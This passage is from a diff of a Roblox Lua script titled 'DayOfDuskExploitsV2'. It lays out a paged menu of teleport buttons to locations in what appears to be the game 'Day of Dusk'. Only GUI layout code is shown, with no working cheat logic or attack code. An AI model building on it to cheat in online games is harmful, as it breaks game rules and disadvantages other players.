+DayOfDuskExploitsV2.UICorner_69.Parent = DayOfDuskExploitsV2.Refinery
+
+DayOfDuskExploitsV2.Z14Entrance.Name = "Z14Entrance"
+DayOfDuskExploitsV2.Z14Entrance.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.Z14Entrance.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Z14Entrance.Position = UDim2.new(0.365448534, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.Z14Entrance.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Z14Entrance.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Z14Entrance.Text = "Zone 14"
+DayOfDuskExploitsV2.Z14Entrance.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Z14Entrance.TextScaled = true
+DayOfDuskExploitsV2.Z14Entrance.TextSize = 14.000
+DayOfDuskExploitsV2.Z14Entrance.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_70.Parent = DayOfDuskExploitsV2.Z14Entrance
+
+DayOfDuskExploitsV2.FedorialiteOre.Name = "FedorialiteOre"
+DayOfDuskExploitsV2.FedorialiteOre.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.FedorialiteOre.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.FedorialiteOre.Position = UDim2.new(0.0564784035, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.FedorialiteOre.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.FedorialiteOre.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.FedorialiteOre.Text = "☢ Fedorialite Ore"
+DayOfDuskExploitsV2.FedorialiteOre.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.FedorialiteOre.TextScaled = true
+DayOfDuskExploitsV2.FedorialiteOre.TextSize = 14.000
+DayOfDuskExploitsV2.FedorialiteOre.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_71.Parent = DayOfDuskExploitsV2.FedorialiteOre
+
+DayOfDuskExploitsV2.SV.Name = "SV"
+DayOfDuskExploitsV2.SV.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.SV.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.SV.Position = UDim2.new(0.671096325, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.SV.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.SV.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.SV.Text = "☢ SV-030-C"
+DayOfDuskExploitsV2.SV.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.SV.TextSize = 14.000
+DayOfDuskExploitsV2.SV.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_72.Parent = DayOfDuskExploitsV2.SV
+
+DayOfDuskExploitsV2.OrangaOre.Name = "OrangaOre"
+DayOfDuskExploitsV2.OrangaOre.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.OrangaOre.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.OrangaOre.Position = UDim2.new(0.368770808, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.OrangaOre.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.OrangaOre.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.OrangaOre.Text = "☢ Oranga Ore"
+DayOfDuskExploitsV2.OrangaOre.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.OrangaOre.TextSize = 14.000
+DayOfDuskExploitsV2.OrangaOre.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_73.Parent = DayOfDuskExploitsV2.OrangaOre
+
+DayOfDuskExploitsV2.ShadowRealm.Name = "ShadowRealm"
+DayOfDuskExploitsV2.ShadowRealm.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.ShadowRealm.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.ShadowRealm.Position = UDim2.new(0.0598006621, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.ShadowRealm.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.ShadowRealm.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.ShadowRealm.Text = "☢ Shadow Realm"
+DayOfDuskExploitsV2.ShadowRealm.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.ShadowRealm.TextScaled = true
+DayOfDuskExploitsV2.ShadowRealm.TextSize = 14.000
+DayOfDuskExploitsV2.ShadowRealm.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_74.Parent = DayOfDuskExploitsV2.ShadowRealm
+
+DayOfDuskExploitsV2.Page3.Name = "Page3"
+DayOfDuskExploitsV2.Page3.Parent = DayOfDuskExploitsV2.TeleportFrame
+DayOfDuskExploitsV2.Page3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.Page3.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.Page3.Size = UDim2.new(1, 0, 1, 0)
+DayOfDuskExploitsV2.Page3.Visible = false
+
+DayOfDuskExploitsV2.TeleportLabel3.Name = "TeleportLabel3"
+DayOfDuskExploitsV2.TeleportLabel3.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.TeleportLabel3.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.TeleportLabel3.Position = UDim2.new(0.0505211912, 0, 0.171091452, 0)
+DayOfDuskExploitsV2.TeleportLabel3.Size = UDim2.new(0, 269, 0, 19)
+DayOfDuskExploitsV2.TeleportLabel3.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.TeleportLabel3.Text = "Teleports"
+DayOfDuskExploitsV2.TeleportLabel3.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.TeleportLabel3.TextSize = 14.000
+DayOfDuskExploitsV2.TeleportLabel3.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_75.Parent = DayOfDuskExploitsV2.TeleportLabel3
+
+DayOfDuskExploitsV2.BackToMenu7.Name = "BackToMenu7"
+DayOfDuskExploitsV2.BackToMenu7.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.BackToMenu7.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+DayOfDuskExploitsV2.BackToMenu7.Position = UDim2.new(0.0498338863, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.BackToMenu7.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.BackToMenu7.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.BackToMenu7.Text = "Back"
+DayOfDuskExploitsV2.BackToMenu7.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.BackToMenu7.TextScaled = true
+DayOfDuskExploitsV2.BackToMenu7.TextSize = 14.000
+DayOfDuskExploitsV2.BackToMenu7.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_76.Parent = DayOfDuskExploitsV2.BackToMenu7
+
+DayOfDuskExploitsV2.NextPage3.Name = "NextPage3"
+DayOfDuskExploitsV2.NextPage3.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.NextPage3.BackgroundColor3 = Color3.fromRGB(85, 0, 0)
+DayOfDuskExploitsV2.NextPage3.Position = UDim2.new(0.661129594, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.NextPage3.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.NextPage3.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.NextPage3.Text = ">"
+DayOfDuskExploitsV2.NextPage3.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.NextPage3.TextScaled = true
+DayOfDuskExploitsV2.NextPage3.TextSize = 14.000
+DayOfDuskExploitsV2.NextPage3.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_77.Parent = DayOfDuskExploitsV2.NextPage3
+
+DayOfDuskExploitsV2.PreviousPage3.Name = "PreviousPage3"
+DayOfDuskExploitsV2.PreviousPage3.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.PreviousPage3.BackgroundColor3 = Color3.fromRGB(85, 0, 0)
+DayOfDuskExploitsV2.PreviousPage3.Position = UDim2.new(0.358803988, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.PreviousPage3.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.PreviousPage3.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.PreviousPage3.Text = "<"
+DayOfDuskExploitsV2.PreviousPage3.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.PreviousPage3.TextScaled = true
+DayOfDuskExploitsV2.PreviousPage3.TextSize = 14.000
+DayOfDuskExploitsV2.PreviousPage3.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_78.Parent = DayOfDuskExploitsV2.PreviousPage3
+
+DayOfDuskExploitsV2.Dew_Crack.Name = "Dew_Crack"
+DayOfDuskExploitsV2.Dew_Crack.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.Dew_Crack.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Dew_Crack.Position = UDim2.new(0.661129594, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.Dew_Crack.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Dew_Crack.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Dew_Crack.Text = "DEW-3C"
+DayOfDuskExploitsV2.Dew_Crack.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Dew_Crack.TextScaled = true
+DayOfDuskExploitsV2.Dew_Crack.TextSize = 14.000
+DayOfDuskExploitsV2.Dew_Crack.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_79.Parent = DayOfDuskExploitsV2.Dew_Crack
+
+DayOfDuskExploitsV2.TowerTop.Name = "TowerTop"
+DayOfDuskExploitsV2.TowerTop.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.TowerTop.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.TowerTop.Position = UDim2.new(0.358803988, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.TowerTop.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.TowerTop.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.TowerTop.Text = "Top Of Tower"
+DayOfDuskExploitsV2.TowerTop.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.TowerTop.TextScaled = true
+DayOfDuskExploitsV2.TowerTop.TextSize = 14.000
+DayOfDuskExploitsV2.TowerTop.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_80.Parent = DayOfDuskExploitsV2.TowerTop
+
+DayOfDuskExploitsV2.DiamondOre.Name = "DiamondOre"
+DayOfDuskExploitsV2.DiamondOre.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.DiamondOre.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.DiamondOre.Position = UDim2.new(0.0498338863, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.DiamondOre.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.DiamondOre.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.DiamondOre.Text = "☢ DiamondOre"
+DayOfDuskExploitsV2.DiamondOre.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.DiamondOre.TextScaled = true
+DayOfDuskExploitsV2.DiamondOre.TextSize = 14.000
+DayOfDuskExploitsV2.DiamondOre.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_81.Parent = DayOfDuskExploitsV2.DiamondOre
+
+DayOfDuskExploitsV2.GoldOre.Name = "GoldOre"
+DayOfDuskExploitsV2.GoldOre.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.GoldOre.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.GoldOre.Position = UDim2.new(0.664451838, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.GoldOre.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.GoldOre.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.GoldOre.Text = "Gold Ore"
+DayOfDuskExploitsV2.GoldOre.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.GoldOre.TextScaled = true
+DayOfDuskExploitsV2.GoldOre.TextSize = 14.000
+DayOfDuskExploitsV2.GoldOre.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_82.Parent = DayOfDuskExploitsV2.GoldOre
+
+DayOfDuskExploitsV2.City.Name = "City"
+DayOfDuskExploitsV2.City.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.City.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.City.Position = UDim2.new(0.362126261, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.City.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.City.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.City.Text = "City"
+DayOfDuskExploitsV2.City.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.City.TextScaled = true
+DayOfDuskExploitsV2.City.TextSize = 14.000
+DayOfDuskExploitsV2.City.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_83.Parent = DayOfDuskExploitsV2.City
+
+DayOfDuskExploitsV2.GateButton.Name = "GateButton"
+DayOfDuskExploitsV2.GateButton.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.GateButton.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.GateButton.Position = UDim2.new(0.0531561449, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.GateButton.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.GateButton.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.GateButton.Text = "⚠️ Gate Button"
+DayOfDuskExploitsV2.GateButton.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.GateButton.TextScaled = true
+DayOfDuskExploitsV2.GateButton.TextSize = 14.000
+DayOfDuskExploitsV2.GateButton.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_84.Parent = DayOfDuskExploitsV2.GateButton
+
+DayOfDuskExploitsV2.GateRoom.Name = "GateRoom"
+DayOfDuskExploitsV2.GateRoom.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.GateRoom.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.GateRoom.Position = UDim2.new(0.667774081, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.GateRoom.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.GateRoom.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.GateRoom.Text = "⚠️ Gate Room"
+DayOfDuskExploitsV2.GateRoom.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.GateRoom.TextScaled = true
+DayOfDuskExploitsV2.GateRoom.TextSize = 14.000
+DayOfDuskExploitsV2.GateRoom.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_85.Parent = DayOfDuskExploitsV2.GateRoom
+
+DayOfDuskExploitsV2.RoofBunker.Name = "RoofBunker"
+DayOfDuskExploitsV2.RoofBunker.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.RoofBunker.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.RoofBunker.Position = UDim2.new(0.365448534, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.RoofBunker.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.RoofBunker.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.RoofBunker.Text = "Roof Bunker"
+DayOfDuskExploitsV2.RoofBunker.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.RoofBunker.TextScaled = true
+DayOfDuskExploitsV2.RoofBunker.TextSize = 14.000
+DayOfDuskExploitsV2.RoofBunker.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_86.Parent = DayOfDuskExploitsV2.RoofBunker
+
+DayOfDuskExploitsV2.Warehouse.Name = "Warehouse"
+DayOfDuskExploitsV2.Warehouse.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.Warehouse.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Warehouse.Position = UDim2.new(0.0564784035, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.Warehouse.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Warehouse.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Warehouse.Text = "Warehouse"
+DayOfDuskExploitsV2.Warehouse.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Warehouse.TextScaled = true
+DayOfDuskExploitsV2.Warehouse.TextSize = 14.000
+DayOfDuskExploitsV2.Warehouse.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_87.Parent = DayOfDuskExploitsV2.Warehouse
+
+DayOfDuskExploitsV2.Coolant.Name = "Coolant"
+DayOfDuskExploitsV2.Coolant.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.Coolant.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Coolant.Position = UDim2.new(0.671096325, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.Coolant.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Coolant.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Coolant.Text = "Coolant"
+DayOfDuskExploitsV2.Coolant.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Coolant.TextSize = 14.000
+DayOfDuskExploitsV2.Coolant.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_88.Parent = DayOfDuskExploitsV2.Coolant
+
+DayOfDuskExploitsV2.ReactorOut.Name = "ReactorOut"
+DayOfDuskExploitsV2.ReactorOut.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.ReactorOut.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.ReactorOut.Position = UDim2.new(0.368770808, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.ReactorOut.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.ReactorOut.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.ReactorOut.Text = "Reactor (Outside)"
+DayOfDuskExploitsV2.ReactorOut.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.ReactorOut.TextSize = 14.000
+DayOfDuskExploitsV2.ReactorOut.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_89.Parent = DayOfDuskExploitsV2.ReactorOut
+
+DayOfDuskExploitsV2.ReactorIn.Name = "ReactorIn"
+DayOfDuskExploitsV2.ReactorIn.Parent = DayOfDuskExploitsV2.Page3
+DayOfDuskExploitsV2.ReactorIn.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.ReactorIn.Position = UDim2.new(0.0598006621, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.ReactorIn.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.ReactorIn.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.ReactorIn.Text = "☢ Reactor (Inside)"
+DayOfDuskExploitsV2.ReactorIn.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.ReactorIn.TextScaled = true
+DayOfDuskExploitsV2.ReactorIn.TextSize = 14.000
+DayOfDuskExploitsV2.ReactorIn.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_90.Parent = DayOfDuskExploitsV2.ReactorIn
+
+DayOfDuskExploitsV2.Page4.Name = "Page4"
+DayOfDuskExploitsV2.Page4.Parent = DayOfDuskExploitsV2.TeleportFrame
+DayOfDuskExploitsV2.Page4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.Page4.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.Page4.Size = UDim2.new(1, 0, 1, 0)
+DayOfDuskExploitsV2.Page4.Visible = false
+
+DayOfDuskExploitsV2.TeleportLabel4.Name = "TeleportLabel4"
+DayOfDuskExploitsV2.TeleportLabel4.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.TeleportLabel4.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.TeleportLabel4.Position = UDim2.new(0.0505211912, 0, 0.171091452, 0)
+DayOfDuskExploitsV2.TeleportLabel4.Size = UDim2.new(0, 269, 0, 19)
+DayOfDuskExploitsV2.TeleportLabel4.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.TeleportLabel4.Text = "Teleports"
+DayOfDuskExploitsV2.TeleportLabel4.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.TeleportLabel4.TextSize = 14.000
+DayOfDuskExploitsV2.TeleportLabel4.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_91.Parent = DayOfDuskExploitsV2.TeleportLabel4
+
+DayOfDuskExploitsV2.BackToMenu8.Name = "BackToMenu8"
+DayOfDuskExploitsV2.BackToMenu8.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.BackToMenu8.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+DayOfDuskExploitsV2.BackToMenu8.Position = UDim2.new(0.0498338863, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.BackToMenu8.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.BackToMenu8.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.BackToMenu8.Text = "Back"
+DayOfDuskExploitsV2.BackToMenu8.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.BackToMenu8.TextScaled = true
+DayOfDuskExploitsV2.BackToMenu8.TextSize = 14.000
+DayOfDuskExploitsV2.BackToMenu8.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_92.Parent = DayOfDuskExploitsV2.BackToMenu8
+
+DayOfDuskExploitsV2.NextPage4.Name = "NextPage4"
+DayOfDuskExploitsV2.NextPage4.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.NextPage4.BackgroundColor3 = Color3.fromRGB(85, 0, 0)
+DayOfDuskExploitsV2.NextPage4.Position = UDim2.new(0.661129594, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.NextPage4.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.NextPage4.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.NextPage4.Text = ">"
+DayOfDuskExploitsV2.NextPage4.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.NextPage4.TextScaled = true
+DayOfDuskExploitsV2.NextPage4.TextSize = 14.000
+DayOfDuskExploitsV2.NextPage4.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_93.Parent = DayOfDuskExploitsV2.NextPage4
+
+DayOfDuskExploitsV2.PreviousPage4.Name = "PreviousPage4"
+DayOfDuskExploitsV2.PreviousPage4.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.PreviousPage4.BackgroundColor3 = Color3.fromRGB(85, 0, 0)
+DayOfDuskExploitsV2.PreviousPage4.Position = UDim2.new(0.358803988, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.PreviousPage4.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.PreviousPage4.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.PreviousPage4.Text = "<"
+DayOfDuskExploitsV2.PreviousPage4.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.PreviousPage4.TextScaled = true
+DayOfDuskExploitsV2.PreviousPage4.TextSize = 14.000
+DayOfDuskExploitsV2.PreviousPage4.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_94.Parent = DayOfDuskExploitsV2.PreviousPage4
+
+DayOfDuskExploitsV2.Death.Name = "Death"
+DayOfDuskExploitsV2.Death.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.Death.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Death.Position = UDim2.new(0.661129594, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.Death.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Death.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Death.Text = "???"
+DayOfDuskExploitsV2.Death.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Death.TextScaled = true
+DayOfDuskExploitsV2.Death.TextSize = 14.000
+DayOfDuskExploitsV2.Death.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_95.Parent = DayOfDuskExploitsV2.Death
+
+DayOfDuskExploitsV2.AegisSpawn.Name = "AegisSpawn"
+DayOfDuskExploitsV2.AegisSpawn.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.AegisSpawn.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.AegisSpawn.Position = UDim2.new(0.358803988, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.AegisSpawn.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.AegisSpawn.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.AegisSpawn.Text = "⚠️ Aegis Spawn"
+DayOfDuskExploitsV2.AegisSpawn.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.AegisSpawn.TextScaled = true
+DayOfDuskExploitsV2.AegisSpawn.TextSize = 14.000
+DayOfDuskExploitsV2.AegisSpawn.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_96.Parent = DayOfDuskExploitsV2.AegisSpawn
+
+DayOfDuskExploitsV2.Caves.Name = "Caves"
+DayOfDuskExploitsV2.Caves.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.Caves.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Caves.Position = UDim2.new(0.0498338863, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.Caves.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Caves.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Caves.Text = "🛑 Caves"
+DayOfDuskExploitsV2.Caves.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Caves.TextScaled = true
+DayOfDuskExploitsV2.Caves.TextSize = 14.000
+DayOfDuskExploitsV2.Caves.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_97.Parent = DayOfDuskExploitsV2.Caves
+
+DayOfDuskExploitsV2.Rockstar.Name = "Rockstar"
+DayOfDuskExploitsV2.Rockstar.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.Rockstar.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Rockstar.Position = UDim2.new(0.664451838, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.Rockstar.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Rockstar.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Rockstar.Text = "Rockstar"
+DayOfDuskExploitsV2.Rockstar.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Rockstar.TextScaled = true
+DayOfDuskExploitsV2.Rockstar.TextSize = 14.000
+DayOfDuskExploitsV2.Rockstar.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_98.Parent = DayOfDuskExploitsV2.Rockstar
+
+DayOfDuskExploitsV2.RockStarOverlook.Name = "RockStarOverlook"
+DayOfDuskExploitsV2.RockStarOverlook.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.RockStarOverlook.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.RockStarOverlook.Position = UDim2.new(0.362126261, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.RockStarOverlook.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.RockStarOverlook.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.RockStarOverlook.Text = "🛑 Rockstar  Overlook"
+DayOfDuskExploitsV2.RockStarOverlook.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.RockStarOverlook.TextScaled = true
+DayOfDuskExploitsV2.RockStarOverlook.TextSize = 14.000
+DayOfDuskExploitsV2.RockStarOverlook.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_99.Parent = DayOfDuskExploitsV2.RockStarOverlook
+
+DayOfDuskExploitsV2.ExteriorCompound.Name = "ExteriorCompound"
+DayOfDuskExploitsV2.ExteriorCompound.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.ExteriorCompound.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
